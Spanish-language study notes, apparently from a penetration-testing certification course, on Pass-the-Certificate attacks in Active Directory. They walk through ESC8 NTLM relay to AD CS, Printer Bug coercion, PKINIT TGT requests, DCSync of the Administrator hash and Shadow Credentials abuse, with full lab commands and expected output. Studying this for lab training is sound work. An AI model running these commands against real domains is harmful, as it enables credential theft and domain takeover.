
## 1. Conceptos clave

**Pass-the-Certificate** es una técnica que utiliza certificados X.509 y sus claves privadas para autenticarse en Active Directory mediante Kerberos y obtener un **Ticket Granting Ticket (TGT)**.

Está relacionada principalmente con:

- **PKINIT:** extensión de Kerberos que permite utilizar criptografía de clave pública durante la autenticación inicial.
    
- **AD CS:** Servicios de Certificados de Active Directory, utilizados para emitir y gestionar certificados.
    
- **NTLM Relay ESC8:** ataque que retransmite autenticaciones NTLM hacia el servicio web de inscripción de certificados de AD CS.
    
- **Shadow Credentials:** técnica que abusa del atributo `msDS-KeyCredentialLink` para asociar una clave pública controlada por el atacante a una cuenta víctima.
    

### Diferencia entre PtT y Pass-the-Certificate

|Técnica|Material utilizado|Objetivo|
|---|---|---|
|Pass-the-Hash (PtH)|Hash de contraseña compatible|Autenticarse sin conocer la contraseña en texto plano.|
|Pass-the-Ticket (PtT)|Ticket Kerberos válido|Reutilizar un TGT o TGS existente.|
|Pass-the-Certificate|Certificado y clave privada asociados|Autenticarse mediante PKINIT y obtener un TGT.|

**Flujo habitual:**

1. Obtener o generar un certificado válido para una cuenta.
    
2. Utilizar el certificado y su clave privada para solicitar un TGT.
    
3. Guardar el ticket en una caché Kerberos.
    
4. Utilizar el TGT con herramientas compatibles con Kerberos.
    
5. Acceder a los recursos permitidos a la identidad representada por el ticket.

## 2. NTLM Relay contra AD CS — ESC8

### Concepto

ESC8 es un ataque de retransmisión NTLM contra el servicio web de inscripción de certificados de AD CS.

Cuando AD CS tiene habilitada la inscripción web, normalmente se puede acceder a la aplicación mediante una ruta similar a:

```
http://CA-SERVER/CertSrv
```

Si la configuración permite el ataque, una autenticación NTLM retransmitida puede utilizarse para solicitar un certificado para la cuenta víctima.

En el escenario del módulo, se obtiene un certificado para la cuenta de equipo del controlador de dominio: `DC01$`.

### Ejecutar ntlmrelayx

El módulo muestra el siguiente comando:

```
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

Parámetros importantes:

|Parámetro|Función|
|---|---|
|`-t`|Especifica el destino al que se retransmite la autenticación.|
|`--adcs`|Habilita el modo de ataque contra AD CS.|
|`-smb2support`|Habilita la compatibilidad SMB2 del servidor de retransmisión.|
|`--template`|Especifica la plantilla de certificado que se solicitará.|

La plantilla `KerberosAuthentication` es la utilizada en el ejemplo. La plantilla apropiada depende de la configuración del entorno y debe identificarse durante la enumeración.

### Forzar una autenticación con Printer Bug

El módulo presenta el fallo conocido como _Printer Bug_ como un posible método para provocar que un equipo se autentique contra un sistema controlado.

La técnica requiere que la cuenta de máquina objetivo tenga el servicio Print Spooler en ejecución.

Ejemplo del módulo:

```
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"PASSWORD"@10.129.234.109 10.10.16.12
```

Donde:

- `INLANEFREIGHT.LOCAL`: dominio.
    
- `wwhite`: cuenta utilizada para autenticarse.
    
- `10.129.234.109`: dirección del controlador de dominio objetivo.
    
- `10.10.16.12`: dirección del sistema que recibe la autenticación.
    

En el escenario del módulo, la autenticación retransmitida permite solicitar un certificado para `DC01$`.

**Indicadores de éxito en ntlmrelayx:**

```
[*] Authenticating against http://10.129.234.110 as INLANEFREIGHT/DC01$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Writing PKCS#12 certificate to ./DC01$.pfx
```

El archivo `.pfx` contiene el certificado y la clave privada necesarios para el siguiente paso.

## 3. Obtener un TGT mediante PKINITtools

Una vez obtenido el certificado, se puede utilizar `gettgtpkinit.py`, de PKINITtools, para solicitar un TGT mediante PKINIT.

### Preparar la herramienta

```
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```

Si aparece un error relacionado con la detección de la versión de `libcrypto`, el módulo propone instalar `oscrypto`:

```
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

### Solicitar un TGT con un certificado PFX

Ejemplo del laboratorio:

```
python3 gettgtpkinit.py \
    -cert-pfx '../krbrelayx/DC01$.pfx' \
    -dc-ip 10.129.234.109 \
    'inlanefreight.local/dc01$' \
    /tmp/dc.ccache
```

Parámetros:

|Parámetro|Función|
|---|---|
|`-cert-pfx`|Ruta del certificado PKCS#12/PFX.|
|`-dc-ip`|Dirección IP del controlador de dominio.|
|`dominio/usuario`|Identidad para la que se solicita el TGT.|
|Último argumento|Archivo de salida donde se guarda la caché Kerberos.|

Si la operación tiene éxito, la herramienta muestra una clave de cifrado AS-REP y guarda el TGT en el archivo indicado.

**Importante:** la clave de cifrado AS-REP que aparece en la salida no es el TGT. El ticket se guarda en el archivo `.ccache`.

## 4. Utilizar el TGT obtenido — Pass-the-Ticket

Una vez obtenido el TGT, el procedimiento continúa como un ataque Pass-the-Ticket.

### Configurar la caché Kerberos

```
export KRB5CCNAME=/tmp/dc.ccache
```

Comprueba el contenido:

```
klist
```

La salida debe mostrar el principal correspondiente a la cuenta para la que se obtuvo el ticket.

### Utilizar Impacket para realizar DCSync

En el escenario del módulo, se utiliza el TGT de `DC01$` para solicitar las credenciales de la cuenta Administrator mediante `secretsdump.py`:

```
impacket-secretsdump \
    -k \
    -no-pass \
    -dc-ip 10.129.234.109 \
    -just-dc-user Administrator \
    'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

Parámetros importantes:

|Parámetro|Función|
|---|---|
|`-k`|Utiliza autenticación Kerberos.|
|`-no-pass`|Evita solicitar una contraseña.|
|`-dc-ip`|Especifica la dirección IP del controlador de dominio.|
|`-just-dc-user Administrator`|Limita la extracción a la cuenta indicada.|

En el ejemplo, la salida contiene el hash NTLM de Administrator.

**Condición importante:** obtener un TGT no garantiza que se pueda realizar DCSync. La cuenta representada por el ticket debe disponer de los permisos de replicación de directorio necesarios.

## 5. Shadow Credentials — msDS-KeyCredentialLink

### Concepto

Shadow Credentials es una técnica que abusa del atributo de Active Directory:

```
msDS-KeyCredentialLink
```

Este atributo puede almacenar información de claves públicas asociadas a una cuenta para permitir mecanismos de autenticación mediante PKINIT.

Si una cuenta tiene permisos para modificar ese atributo en un usuario víctima, puede llegar a asociar una clave pública controlada por ella y utilizar la clave privada correspondiente para autenticarse como la víctima.

En BloodHound, la relación:

```
AddKeyCredentialLink
```

indica que una identidad tiene permisos para añadir una entrada a ese atributo de otra cuenta.

### Herramienta utilizada: pywhisker

El módulo utiliza `pywhisker` para gestionar las credenciales sombra desde Linux.

Ejemplo del laboratorio:

```
pywhisker \
    --dc-ip 10.129.234.109 \
    -d INLANEFREIGHT.LOCAL \
    -u wwhite \
    -p 'PASSWORD' \
    --target jpinkman \
    --action add
```

Parámetros:

|Parámetro|Función|
|---|---|
|`--dc-ip`|IP del controlador de dominio.|
|`-d`|Dominio de Active Directory.|
|`-u`|Usuario que realiza la operación.|
|`-p`|Contraseña del usuario.|
|`--target`|Cuenta víctima.|
|`--action add`|Añade una credencial al atributo objetivo.|

### Resultado esperado

Si la operación tiene éxito, la herramienta:

1. Localiza la cuenta objetivo.
    
2. Genera un certificado.
    
3. Genera una entrada KeyCredential.
    
4. Modifica `msDS-KeyCredentialLink`.
    
5. Guarda un archivo `.pfx` con el certificado y su clave privada.
    
6. Muestra la contraseña necesaria para utilizar el PFX.
    

El archivo PFX se utilizará posteriormente para solicitar un TGT como la víctima.

**Punto crítico:** es necesario tener permisos suficientes para modificar `msDS-KeyCredentialLink` en la cuenta objetivo.

## 6. Obtener un TGT mediante Shadow Credentials

Una vez creado el archivo PFX con pywhisker, se utiliza `gettgtpkinit.py` para obtener un TGT de la cuenta víctima.

Ejemplo del módulo:

```
python3 gettgtpkinit.py \
    -cert-pfx '../eFUVVTPf.pfx' \
    -pfx-pass 'PFX_PASSWORD' \
    -dc-ip 10.129.234.109 \
    INLANEFREIGHT.LOCAL/jpinkman \
    /tmp/jpinkman.ccache
```

Parámetros adicionales:

|Parámetro|Función|
|---|---|
|`-pfx-pass`|Contraseña del archivo PFX.|

Si la autenticación funciona, se genera la caché:

```
/tmp/jpinkman.ccache
```

### Activar y comprobar el ticket

```
export KRB5CCNAME=/tmp/jpinkman.ccache
klist
```

Salida esperada:

```
Default principal: jpinkman@INLANEFREIGHT.LOCAL
```

Ahora las herramientas compatibles con Kerberos pueden utilizar el ticket de esa cuenta.

## 7. Utilizar el ticket con Evil-WinRM

En el ejemplo del módulo, la cuenta víctima pertenece al grupo `Remote Management Users`, lo que le permite acceder mediante WinRM.

Primero, hay que asegurarse de que `/etc/krb5.conf` esté configurado correctamente y de que el nombre del controlador de dominio se resuelva.

### Conectarse mediante Kerberos

```
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

Después, validar la identidad:

```
whoami
```

Resultado esperado en el laboratorio:

```
inlanefreight\jpinkman
```

**Importante:** para que funcione, deben cumplirse varias condiciones:

- El ticket debe ser válido.
    
- El realm y la resolución DNS deben ser correctos.
    
- WinRM debe estar accesible.
    
- La cuenta debe tener permisos para iniciar sesión mediante WinRM.

## 8. ¿Qué ocurre si PKINIT no está disponible?

En determinados entornos, puede obtenerse un certificado válido, pero no utilizarlo para la autenticación inicial mediante PKINIT en una cuenta específica.

El módulo presenta **PassTheCert** como alternativa para estos casos.

PassTheCert permite utilizar un certificado para autenticarse contra LDAPS y realizar determinadas operaciones, dependiendo de los permisos disponibles, como:

- Cambiar contraseñas.
    
- Conceder permisos de replicación de directorio.
    
- Realizar otras operaciones LDAP autorizadas.
    

Esta técnica queda fuera del alcance detallado de la sección.

## 9. Flujo de trabajo para un laboratorio CPTS/OSCP

### Escenario A: NTLM Relay a AD CS — ESC8

1. Identificar una instancia de AD CS con inscripción web y comprobar si su configuración es vulnerable a retransmisión NTLM.
    
2. Identificar una forma de provocar o recibir una autenticación NTLM.
    
3. Retransmitir la autenticación con `ntlmrelayx`.
    
4. Obtener el certificado de la identidad autenticada.
    
5. Utilizar `gettgtpkinit.py` para solicitar un TGT.
    
6. Guardar el ticket en una caché `.ccache`.
    
7. Configurar `KRB5CCNAME`.
    
8. Utilizar herramientas compatibles con Kerberos.
    
9. Comprobar qué recursos y operaciones permite la identidad obtenida.
    

### Escenario B: Shadow Credentials

1. Enumerar permisos sobre usuarios y objetos de Active Directory.
    
2. Buscar relaciones `AddKeyCredentialLink` en BloodHound.
    
3. Confirmar que la identidad controlada puede modificar `msDS-KeyCredentialLink` de la víctima.
    
4. Utilizar pywhisker para generar y asociar la credencial.
    
5. Obtener el archivo PFX y su contraseña.
    
6. Solicitar un TGT con `gettgtpkinit.py`.
    
7. Configurar `KRB5CCNAME`.
    
8. Validar la identidad con `klist`.
    
9. Acceder a servicios para los que la cuenta tenga permisos, como WinRM.

## 11. Errores y consideraciones importantes

- **Certificado obtenido, pero no se consigue un TGT:** comprueba que el certificado corresponde a la identidad indicada, que su clave privada está disponible y que PKINIT es compatible con el entorno.
    
- **Error relacionado con** `**libcrypto**`**:** el módulo propone probar la instalación de `oscrypto`.
    
- **TGT obtenido, pero falla el acceso remoto:** verifica la expiración del ticket, la resolución de nombres, la conectividad y los permisos de la cuenta.
    
- **DCSync no funciona:** tener un TGT no concede automáticamente los derechos de replicación de directorio.
    
- **Shadow Credentials falla:** comprueba si el usuario tiene permisos para modificar `msDS-KeyCredentialLink` en la víctima.
    
- **Evil-WinRM no conecta:** verifica la configuración Kerberos, el nombre del controlador de dominio y los permisos de acceso mediante WinRM.
    
- **PKINIT no está disponible:** PassTheCert es una alternativa que puede ser relevante según la configuración del entorno.

## Resumen final

**Pass-the-Certificate permite utilizar certificados y claves privadas para obtener acceso mediante autenticación basada en certificados.**

Los dos escenarios principales de esta sección son:

1. **ESC8:** retransmitir una autenticación NTLM hacia AD CS para conseguir un certificado de la identidad víctima.
    
2. **Shadow Credentials:** abusar de permisos sobre `msDS-KeyCredentialLink` para asociar una clave pública controlada y autenticarse como otra cuenta.
    

El flujo común es:

```
Certificado + clave privada
          |
          v
Autenticación mediante PKINIT
          |
          v
       Obtener TGT
          |
          v
  Guardar ticket en ccache
          |
          v
 Configurar KRB5CCNAME
          |
          v
 Utilizar herramientas Kerberos
          |
          v
Acceder a recursos según permisos
```

**Lo más importante para el examen:** identificar las condiciones necesarias para obtener el certificado, comprender la diferencia entre PKINIT y PtT, saber qué función cumplen `gettgtpkinit.py`, `pywhisker` y `ntlmrelayx`, y recordar que conseguir un certificado o un TGT no implica automáticamente tener privilegios de administrador.
